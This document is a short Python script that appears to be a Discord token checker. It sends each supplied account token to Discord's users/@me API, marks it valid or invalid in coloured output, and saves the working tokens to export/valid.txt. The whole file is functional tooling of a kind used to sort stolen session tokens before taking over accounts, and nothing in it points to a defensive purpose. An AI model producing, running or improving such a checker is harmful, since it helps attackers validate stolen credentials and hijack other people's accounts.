import requests
import os

VALID = '\033[92m'
INVALID = '\033[91m'
RESET = '\033[0m'
total = 0
val = 0
inv = 0

os.system("")

def getint(arg):
    if arg == 1:
        global val
        return val
    elif arg == 2:
        global inv
        return inv
    elif arg == 3:
        global total
        return total

def check_token(token):
    global total
    global val
    global inv
    total += 1
    headers = {
        'Authorization': token
    }
    url = 'https://discord.com/api/v6/users/@me'
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print(f'{VALID} [+] {RESET} {token}')
        val += 1
        with open('export/valid.txt', 'a') as f:
            f.write(token + '\n')
    else:
        print(f'{INVALID} [-] {RESET} {token}')
        inv += 1
